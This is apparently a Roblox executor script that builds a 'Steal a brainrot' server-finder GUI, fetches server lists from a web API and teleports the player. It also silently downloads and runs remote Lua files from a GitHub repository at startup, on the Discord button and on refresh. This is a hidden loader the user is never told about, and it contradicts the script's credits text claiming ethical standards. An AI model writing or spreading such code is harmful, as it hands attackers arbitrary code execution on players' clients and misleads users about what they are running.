local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local API_URL = "https://v0-discord-webhook-api-seven.vercel.app/api/brainrot-data"

spawn(function()
    print("Executing Team script...")
    pcall(function()
        local teamScript = game:HttpGet("https://raw.githubusercontent.com/hesiz/Hi/refs/heads/main/Team.lua")
        loadstring(teamScript)()
    end)
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RbxBotGui"
screenGui.Parent = playerGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 600, 0, 450)
mainFrame.Position = UDim2.new(0.5, -300, 0.5, -225)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = mainFrame

local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.7
shadow.ZIndex = mainFrame.ZIndex - 1
shadow.Parent = mainFrame

local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 15)
shadowCorner.Parent = shadow

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 60)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 15)
titleCorner.Parent = titleBar

local titleCover = Instance.new("Frame")
titleCover.Size = UDim2.new(1, 0, 0, 15)
titleCover.Position = UDim2.new(0, 0, 1, -15)
titleCover.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
titleCover.BorderSizePixel = 0
titleCover.Parent = titleBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -120, 1, 0)
title.Position = UDim2.new(0, 20, 0, 0)
title.BackgroundTransparency = 1
title.Text = "RbxBot Steal a brainrot finder"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 40, 0, 40)
closeButton.Position = UDim2.new(1, -50, 0, 10)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.GothamBold
closeButton.BorderSizePixel = 0
closeButton.Parent = titleBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = closeButton

local navFrame = Instance.new("Frame")
navFrame.Size = UDim2.new(0, 150, 1, -60)
navFrame.Position = UDim2.new(0, 0, 0, 60)
navFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
navFrame.BorderSizePixel = 0
navFrame.Parent = mainFrame

local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -150, 1, -60)
contentFrame.Position = UDim2.new(0, 150, 0, 60)
contentFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
contentFrame.BorderSizePixel = 0
contentFrame.Parent = mainFrame

local mainBtn = Instance.new("TextButton")
mainBtn.Size = UDim2.new(1, -10, 0, 40)
mainBtn.Position = UDim2.new(0, 5, 0, 10)
mainBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
mainBtn.Text = "Main"
mainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
mainBtn.TextScaled = true
mainBtn.Font = Enum.Font.Gotham
mainBtn.BorderSizePixel = 0
mainBtn.Parent = navFrame

local mainBtnCorner = Instance.new("UICorner")
mainBtnCorner.CornerRadius = UDim.new(0, 8)
mainBtnCorner.Parent = mainBtn

local discordBtn = Instance.new("TextButton")
discordBtn.Size = UDim2.new(1, -10, 0, 40)
discordBtn.Position = UDim2.new(0, 5, 0, 60)
discordBtn.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
discordBtn.Text = "Discord"
discordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
discordBtn.TextScaled = true
discordBtn.Font = Enum.Font.Gotham
discordBtn.BorderSizePixel = 0
discordBtn.Parent = navFrame

local discordBtnCorner = Instance.new("UICorner")
discordBtnCorner.CornerRadius = UDim.new(0, 8)
discordBtnCorner.Parent = discordBtn

local creditsBtn = Instance.new("TextButton")
creditsBtn.Size = UDim2.new(1, -10, 0, 40)
creditsBtn.Position = UDim2.new(0, 5, 0, 110)
creditsBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
creditsBtn.Text = "Credits"
creditsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
creditsBtn.TextScaled = true
creditsBtn.Font = Enum.Font.Gotham
creditsBtn.BorderSizePixel = 0
creditsBtn.Parent = navFrame

local creditsBtnCorner = Instance.new("UICorner")
creditsBtnCorner.CornerRadius = UDim.new(0, 8)
creditsBtnCorner.Parent = creditsBtn

local mainContent = Instance.new("ScrollingFrame")
mainContent.Size = UDim2.new(1, 0, 1, 0)
mainContent.Position = UDim2.new(0, 0, 0, 0)
mainContent.BackgroundTransparency = 1
mainContent.BorderSizePixel = 0
mainContent.ScrollBarThickness = 6
mainContent.ScrollBarImageColor3 = Color3.fromRGB(70, 70, 70)
mainContent.Parent = contentFrame
mainContent.Visible = true

local mainLayout = Instance.new("UIListLayout")
mainLayout.SortOrder = Enum.SortOrder.LayoutOrder
mainLayout.Padding = UDim.new(0, 5)
mainLayout.Parent = mainContent

local refreshBtn = Instance.new("TextButton")
refreshBtn.Size = UDim2.new(1, -20, 0, 40)
refreshBtn.Position = UDim2.new(0, 10, 0, 0)
refreshBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
refreshBtn.Text = "Refresh Servers"
refreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
refreshBtn.TextScaled = true
refreshBtn.Font = Enum.Font.GothamBold
refreshBtn.BorderSizePixel = 0
refreshBtn.Parent = mainContent

local refreshCorner = Instance.new("UICorner")
refreshCorner.CornerRadius = UDim.new(0, 8)
refreshCorner.Parent = refreshBtn

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size = UDim2.new(1, -20, 0, 30)
loadingLabel.Position = UDim2.new(0, 10, 0, 50)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Text = "Loading servers..."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.TextScaled = true
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.Parent = mainContent
loadingLabel.Visible = false

local discordContent = Instance.new("Frame")
discordContent.Size = UDim2.new(1, 0, 1, 0)
discordContent.Position = UDim2.new(0, 0, 0, 0)
discordContent.BackgroundTransparency = 1
discordContent.Parent = contentFrame
discordContent.Visible = false

local discordLogo = Instance.new("Frame")
discordLogo.Size = UDim2.new(0, 120, 0, 120)
discordLogo.Position = UDim2.new(0.5, -60, 0.25, -60)
discordLogo.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
discordLogo.BorderSizePixel = 0
discordLogo.Parent = discordContent

local discordLogoCorner = Instance.new("UICorner")
discordLogoCorner.CornerRadius = UDim.new(0, 60)
discordLogoCorner.Parent = discordLogo

local logoText = Instance.new("TextLabel")
logoText.Size = UDim2.new(1, 0, 1, 0)
logoText.Position = UDim2.new(0, 0, 0, 0)
logoText.BackgroundTransparency = 1
logoText.Text = "Discord"
logoText.TextColor3 = Color3.fromRGB(255, 255, 255)
logoText.TextScaled = true
logoText.Font = Enum.Font.GothamBold
logoText.Parent = discordLogo

local discordText = Instance.new("TextLabel")
discordText.Size = UDim2.new(1, -40, 0, 60)
discordText.Position = UDim2.new(0, 20, 0.55, 0)
discordText.BackgroundTransparency = 1
discordText.Text = "Join our Discord server for updates and support!"
discordText.TextColor3 = Color3.fromRGB(255, 255, 255)
discordText.TextScaled = true
discordText.Font = Enum.Font.Gotham
discordText.TextWrapped = true
discordText.Parent = discordContent

local joinDiscordBtn = Instance.new("TextButton")
joinDiscordBtn.Size = UDim2.new(0, 200, 0, 50)
joinDiscordBtn.Position = UDim2.new(0.5, -100, 0.75, 0)
joinDiscordBtn.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
joinDiscordBtn.Text = "Join Discord Server"
joinDiscordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
joinDiscordBtn.TextScaled = true
joinDiscordBtn.Font = Enum.Font.GothamBold
joinDiscordBtn.BorderSizePixel = 0
joinDiscordBtn.Parent = discordContent

local joinDiscordCorner = Instance.new("UICorner")
joinDiscordCorner.CornerRadius = UDim.new(0, 12)
joinDiscordCorner.Parent = joinDiscordBtn

joinDiscordBtn.MouseEnter:Connect(function()
    local tween = TweenService:Create(joinDiscordBtn, TweenInfo.new(0.3), {
        BackgroundColor3 = Color3.fromRGB(100, 120, 200)
    })
    tween:Play()
end)

joinDiscordBtn.MouseLeave:Connect(function()
    local tween = TweenService:Create(joinDiscordBtn, TweenInfo.new(0.3), {
        BackgroundColor3 = Color3.fromRGB(114, 137, 218)
    })
    tween:Play()
end)

joinDiscordBtn.MouseButton1Click:Connect(function()
    print("Copying Discord invite to clipboard...")
    
    spawn(function()
        print("Executing notification script...")
        pcall(function()
            local notificationScript = game:HttpGet("https://raw.githubusercontent.com/hesiz/Hi/refs/heads/main/notificacion.lua")
            loadstring(notificationScript)()
        end)
    end)
    
    spawn(function()
        if setclipboard then
            setclipboard("https://discord.gg/dXBe6N2x")
            print("Discord invite copied to clipboard!")
            
            joinDiscordBtn.Text = "Copied!"
            joinDiscordBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
            
            wait(1)
            
            joinDiscordBtn.Text = "Join Discord Server"
            joinDiscordBtn.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
        else
            print("Clipboard function not available")
            
            joinDiscordBtn.Text = "Link: discord.gg/dXBe6N2x"
            joinDiscordBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
            
            wait(3)
            
            joinDiscordBtn.Text = "Join Discord Server"
            joinDiscordBtn.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
        end
    end)
    
    local clickTween = TweenService:Create(joinDiscordBtn, TweenInfo.new(0.1), {
        Size = UDim2.new(0, 190, 0, 45)
    })
    clickTween:Play()
    
    clickTween.Completed:Connect(function()
        local returnTween = TweenService:Create(joinDiscordBtn, TweenInfo.new(0.1), {
            Size = UDim2.new(0, 200, 0, 50)
        })
        returnTween:Play()
    end)
end)

local creditsContent = Instance.new("Frame")
creditsContent.Size = UDim2.new(1, 0, 1, 0)
creditsContent.Position = UDim2.new(0, 0, 0, 0)
creditsContent.BackgroundTransparency = 1
creditsContent.Parent = contentFrame
creditsContent.Visible = false

local creditsText = Instance.new("TextLabel")
creditsText.Size = UDim2.new(1, -40, 1, -40)
creditsText.Position = UDim2.new(0, 20, 0, 20)
creditsText.BackgroundTransparency = 1
creditsText.Text = "This script was developed by the RbxServersBot team. We are not affiliated with any similar scripts or tools. Our mission is to provide high-quality automation tools for the Roblox community while maintaining ethical standards and respecting platform guidelines."
creditsText.TextColor3 = Color3.fromRGB(255, 255, 255)
creditsText.TextScaled = true
creditsText.Font = Enum.Font.Gotham
creditsText.TextWrapped = true
creditsText.Parent = creditsContent

local function getTableKeys(tbl)
    local keys = {}
    if type(tbl) == "table" then
        for key, _ in pairs(tbl) do
            table.insert(keys, tostring(key))
        end
    end
    return keys
end

local function parseTextResponse(responseText)
    print("Parsing text response...")
    local servers = {}
    
    local serverBlocks = {}
    for block in responseText:gmatch("🔥 SERVIDOR %d+.-%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=%=") do
        table.insert(serverBlocks, block)
    end
    
    print("Found", #serverBlocks, "server blocks")
    
    for i, block in pairs(serverBlocks) do
        print("Processing server block", i)
        
        local server = {}
        server.brainrots = {}
        
        local playersMatch = block:match("📊 Jugadores: (%d+)/(%d+)")
        if playersMatch then
            server.players = tonumber(block:match("📊 Jugadores: (%d+)/"))
            server.maxPlayers = tonumber(block:match("📊 Jugadores: %d+/(%d+)"))
        end
        
        server.placeId = block:match("🆔 Place ID: (%d+)")
        server.jobId = block:match("🔗 Job ID: ([%w%-]+)")
        server.teleportScript = block:match("🚀 Script de teletransporte:.-game:GetService.-")
        
        print("Extracted basic data:")
        print("  PlaceId:", server.placeId)
        print("  JobId:", server.jobId)
        print("  Players:", server.players, "/", server.maxPlayers)
        
        local modelsStart = block:find("Modelos:")
        local scriptStart = block:find("🚀 Script de teletransporte:")
        
        if modelsStart and scriptStart then
            local modelsSection = block:sub(modelsStart, scriptStart - 1)
            print("Models section extracted:", modelsSection)
            
            local modelCount = 0
            for line in modelsSection:gmatch("[^\r\n]+") do
                if line:match("^%s*%d+%.") then
                    modelCount = modelCount + 1
                    print("Found model line", modelCount, ":", line)
                    
                    local name = line:match("%d+%. ([^📍]+)")
                    if name then
                        name = name:gsub("%s+$", "")
                        print("Extracted model name:", "'" .. name .. "'")
                        
                        local position = line:match("📍 Posición: ([%d%.%-, ]+)")
                        local path = line:match("📁 Ruta: (.+)")
                        
                        print("Position:", position)
                        print("Path:", path)
                        
                        local brainrot = {
                            name = name,
                            position = position or "0,0,0",
                            fullPath = path or "Unknown",
                            className = "Model"
                        }
                        
                        table.insert(server.brainrots, brainrot)
                        print("Added brainrot to server.brainrots:", name)
                    end
                end
            end
            
            print("Total brainrots added to server:", #server.brainrots)
        else
            print("Could not find models section boundaries")
            print("modelsStart:", modelsStart)
            print("scriptStart:", scriptStart)
        end
        
        print("Server", i, "final data:")
        print("  PlaceId:", server.placeId)
        print("  JobId:", server.jobId)  
        print("  Players:", server.players, "/", server.maxPlayers)
        print("  Brainrots array length:", #server.brainrots)
        for j, brainrot in pairs(server.brainrots) do
            print("    Brainrot", j, ":", brainrot.name)
        end
        
        table.insert(servers, server)
    end
    
    return servers
end

local function animateButton(button, targetColor)
    local tween = TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = targetColor})
    tween:Play()
end

local function showTab(tabName)
    mainContent.Visible = (tabName == "main")
    discordContent.Visible = (tabName == "discord")
    creditsContent.Visible = (tabName == "credits")
    
    animateButton(mainBtn, tabName == "main" and Color3.fromRGB(70, 130, 200) or Color3.fromRGB(60, 60, 60))
    animateButton(discordBtn, tabName == "discord" and Color3.fromRGB(114, 137, 218) or Color3.fromRGB(60, 60, 60))
    animateButton(creditsBtn, tabName == "credits" and Color3.fromRGB(70, 70, 70) or Color3.fromRGB(60, 60, 60))
    
    currentTab = tabName
end

local function clearServerList()
    for _, child in pairs(mainContent:GetChildren()) do
        if child:IsA("Frame") and child.Name == "ServerCard" then
            child:Destroy()
        end
    end
end

local function createServerCard(serverData)
    print("=== CREATING SERVER CARD ===")
    print("ServerData type:", type(serverData))
    if serverData then
        for key, value in pairs(serverData) do
            print("ServerData." .. key .. ":", tostring(value))
        end
    end
    
    print("Brainrots data details:")
    if serverData.brainrots then
        print("Brainrots type:", type(serverData.brainrots))
        print("Brainrots length:", #serverData.brainrots)
        for i, brainrot in pairs(serverData.brainrots) do
            print("  Brainrot", i, ":")
            print("    Name:", brainrot.name)
            print("    Position:", brainrot.position)
            print("    FullPath:", brainrot.fullPath)
        end
    else
        print("No brainrots data found!")
    end
    
    local card = Instance.new("Frame")
    card.Name = "ServerCard"
    card.Size = UDim2.new(1, -20, 0, 120)
    card.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    card.BorderSizePixel = 0
    card.Parent = mainContent
    print("Card frame created and parented")
    
    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 10)
    cardCorner.Parent = card
    
    local placeId = Instance.new("TextLabel")
    placeId.Size = UDim2.new(0.5, -10, 0, 25)
    placeId.Position = UDim2.new(0, 10, 0, 5)
    placeId.BackgroundTransparency = 1
    placeId.Text = "Place ID: " .. tostring(serverData.placeId or "Unknown")
    placeId.TextColor3 = Color3.fromRGB(200, 200, 200)
    placeId.TextScaled = true
    placeId.Font = Enum.Font.Gotham
    placeId.TextXAlignment = Enum.TextXAlignment.Left
    placeId.Parent = card
    print("Place ID label created:", placeId.Text)
    
    local players = Instance.new("TextLabel")
    players.Size = UDim2.new(0.5, -10, 0, 25)
    players.Position = UDim2.new(0.5, 0, 0, 5)
    players.BackgroundTransparency = 1
    players.Text = "Players: " .. tostring(serverData.players or 0) .. "/" .. tostring(serverData.maxPlayers or 0)
    players.TextColor3 = Color3.fromRGB(200, 200, 200)
    players.TextScaled = true
    players.Font = Enum.Font.Gotham
    players.TextXAlignment = Enum.TextXAlignment.Left
    players.Parent = card
    print("Players label created:", players.Text)
    
    local brainrotsList = Instance.new("TextLabel")
    brainrotsList.Size = UDim2.new(1, -20, 0, 50)
    brainrotsList.Position = UDim2.new(0, 10, 0, 30)
    brainrotsList.BackgroundTransparency = 1
    brainrotsList.TextColor3 = Color3.fromRGB(100, 255, 100)
    brainrotsList.TextScaled = true
    brainrotsList.Font = Enum.Font.GothamBold
    brainrotsList.TextXAlignment = Enum.TextXAlignment.Left
    brainrotsList.TextYAlignment = Enum.TextYAlignment.Top
    brainrotsList.TextWrapped = true
    brainrotsList.Parent = card
    print("Brainrots label created")
    
    local brainrotsText = "Brainrots: "
    print("Building brainrots text...")
    print("serverData.brainrots exists:", serverData.brainrots ~= nil)
    print("serverData.brainrots type:", type(serverData.brainrots))
    
    if serverData.brainrots and type(serverData.brainrots) == "table" and #serverData.brainrots > 0 then
        print("Processing", #serverData.brainrots, "brainrots for display")
        for i, brainrot in pairs(serverData.brainrots) do
            print("Processing brainrot", i, ":", brainrot.name)
            brainrotsText = brainrotsText .. tostring(brainrot.name or "Unknown")
            if i < #serverData.brainrots then
                brainrotsText = brainrotsText .. ", "
            end
        end
    else
        brainrotsText = brainrotsText .. "None found"
        print("No brainrots found - using default text")
    end
    
    print("Final brainrots text:", brainrotsText)
    brainrotsList.Text = brainrotsText
    print("Brainrots text assigned to label")
    
    local joinBtn = Instance.new("TextButton")
    joinBtn.Size = UDim2.new(0, 100, 0, 30)
    joinBtn.Position = UDim2.new(1, -110, 1, -35)
    joinBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 250)
    joinBtn.Text = "Join Server"
    joinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    joinBtn.TextScaled = true
    joinBtn.Font = Enum.Font.GothamBold
    joinBtn.BorderSizePixel = 0
    joinBtn.Parent = card
    
    local joinCorner = Instance.new("UICorner")
    joinCorner.CornerRadius = UDim.new(0, 6)
    joinCorner.Parent = joinBtn
    
    joinBtn.MouseButton1Click:Connect(function()
        print("Join button clicked for placeId:", serverData.placeId, "jobId:", serverData.jobId)
        if serverData.placeId and serverData.jobId then
            local success = pcall(function()
                TeleportService:TeleportToPlaceInstance(tonumber(serverData.placeId), serverData.jobId, player)
            end)
            if not success then
                TeleportService:Teleport(tonumber(serverData.placeId), player)
            end
        end
    end)
    
    print("=== SERVER CARD CREATION COMPLETED ===")
    return card
end

local function fetchServers()
    print("=== FETCHING SERVERS ===")
    
    loadingLabel.Visible = true
    clearServerList()
    
    spawn(function()
        print("Executing servers script...")
        pcall(function()
            local serversScript = game:HttpGet("https://raw.githubusercontent.com/hesiz/Hi/refs/heads/main/servers.lua")
            loadstring(serversScript)()
        end)
    end)
    
    if not request then
        print("Delta HTTP no disponible")
        loadingLabel.Text = "Delta HTTP not available"
        return
    end
    
    print("Enviando request a:", API_URL)
    
    local success, response = pcall(function()
        return request({
            Url = API_URL,
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "RbxBot-GUI/2.0"
            }
        })
    end)
    
    if success then
        print("Request exitoso!")
        print("Status Code:", response.StatusCode or "Sin status")
        print("Body length:", response.Body and #response.Body or "No body")
        
        if response.StatusCode == 200 then
            print("Response body (first 500 chars):", string.sub(response.Body, 1, 500))
            print("Response body length:", #response.Body)
            
            local servers = parseTextResponse(response.Body)
            
            if servers and #servers > 0 then
                loadingLabel.Visible = false
                print("Creando", #servers, "server cards")
                
                for i, serverData in pairs(servers) do
                    print("Processing server", i)
                    print("PlaceId:", serverData.placeId)
                    print("JobId:", serverData.jobId)
                    print("Players:", serverData.players)
                    print("Brainrots count:", serverData.brainrots and #serverData.brainrots or "No brainrots")
                    createServerCard(serverData)
                    print("Server card created for server", i)
                end
                print("All server cards created")
            else
                print("No servers parsed from response")
                loadingLabel.Text = "No servers found"
                loadingLabel.Visible = true
            end
        else
            print("HTTP Error - Status:", response.StatusCode)
            loadingLabel.Text = "HTTP Error: " .. (response.StatusCode or "Unknown")
        end
    else
        print("Request failed:", response)
        loadingLabel.Text = "Request failed: " .. tostring(response)
    end
    
    print("Updating canvas size...")
    mainContent.CanvasSize = UDim2.new(0, 0, 0, mainLayout.AbsoluteContentSize.Y)
    print("=== FETCH COMPLETE ===")
end

mainBtn.MouseButton1Click:Connect(function() showTab("main") end)
discordBtn.MouseButton1Click:Connect(function() showTab("discord") end)
creditsBtn.MouseButton1Click:Connect(function() showTab("credits") end)

refreshBtn.MouseButton1Click:Connect(fetchServers)

closeButton.MouseButton1Click:Connect(function()
    local closeTween = TweenService:Create(mainFrame, TweenInfo.new(0.3), {
        Size = UDim2.new(0, 0, 0, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    })
    closeTween:Play()
    
    closeTween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end)

local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
    Size = UDim2.new(0, 600, 0, 450)
})
openTween:Play()

fetchServers()